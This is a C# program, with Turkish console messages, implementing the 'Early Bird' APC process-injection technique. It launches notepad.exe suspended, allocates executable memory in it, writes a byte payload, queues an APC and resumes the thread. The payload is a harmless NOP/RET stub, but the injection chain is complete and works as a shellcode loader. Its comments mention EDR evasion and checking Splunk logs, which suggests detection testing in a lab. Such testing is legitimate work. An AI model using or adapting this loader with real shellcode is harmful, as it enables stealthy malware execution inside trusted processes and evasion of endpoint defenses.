using System;
using System.Runtime.InteropServices;

class EarlyBird
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize;
        public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute;
        public int dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
    }

    static void Main()
    {
        Console.WriteLine("[*] Early Bird Operasyonu Basliyor...");

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        bool res = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
        
        if (!res) {
            Console.WriteLine("[!] Process baslatilamadi amk. EDR tokatlamis olabilir.");
            return;
        }
        Console.WriteLine("[+] Notepad uykuda (SUSPENDED) baslatildi. PID: " + pi.dwProcessId);

        byte[] payload = new byte[] { 0x90, 0x90, 0x90, 0xC3 };
        
        IntPtr allocMemAddress = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
        
        IntPtr bytesWritten;
        WriteProcessMemory(pi.hProcess, allocMemAddress, payload, (uint)payload.Length, out bytesWritten);
        Console.WriteLine("[+] Kod hafizaya yazildi.");

        QueueUserAPC(allocMemAddress, pi.hThread, IntPtr.Zero);
        Console.WriteLine("[+] APC Kuyruguna eklendi! (Early Bird devrede)");

        Console.WriteLine("[*] Kurban uyandiriliyor (ResumeThread)...");
        ResumeThread(pi.hThread);

        Console.WriteLine("[+] Islem tamam! Splunk'tan loglari kontrol et.");
    }
}